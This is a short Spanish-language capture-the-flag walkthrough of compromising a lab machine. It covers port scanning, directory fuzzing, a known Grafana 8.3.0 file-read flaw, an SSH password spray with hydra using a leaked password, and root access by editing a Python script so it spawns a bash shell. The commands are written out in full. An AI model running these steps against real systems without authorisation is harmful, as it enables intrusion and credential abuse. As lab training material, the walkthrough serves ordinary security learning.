Fecha: 03/08/2024
Empiezo escaneando la máquina: 
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](imágenes/Pasted%20image%2020240903173808.png)

Compruebo el puerto 3000 y es grafana v8.3.0. 
Lo primero que hago es fuzzing para buscar algo interesante en el servidor http: 

```bash
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing  
```

![](imágenes/Pasted%20image%2020240903174102.png)

Leyendo maintenance.html, encuentro lo siguiente:
![](imágenes/Pasted%20image%2020240903174130.png)

Paso a investigar sobre esa versión de grafana:
![](imágenes/Pasted%20image%2020240903174249.png)

Usaré el código que proporcionan para intentar abusar de la vulnerabilidad. Me permite leer un archivo, así que elijo el encontrado anteriormente:
![](imágenes/Pasted%20image%2020240903174534.png)

Ahora usaré hydra para probar esta contraseña con múltiples usuarios:
```shell
hydra -p t9sH76gpQ82UFeZ3GXZS  -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt ssh://172.17.0.2 -t 16 
```

![](imágenes/Pasted%20image%2020240903175020.png)

Accedo por ssh y compruebo permisos:
![](imágenes/Pasted%20image%2020240903175158.png)

Como puedo editar el script ya que freddy es el dueño, ejecutaré bash desde el mismo para convertirme en superusuario: 

```python
import os

os.system("/bin/bash")
```

![](imágenes/Pasted%20image%2020240903175702.png)

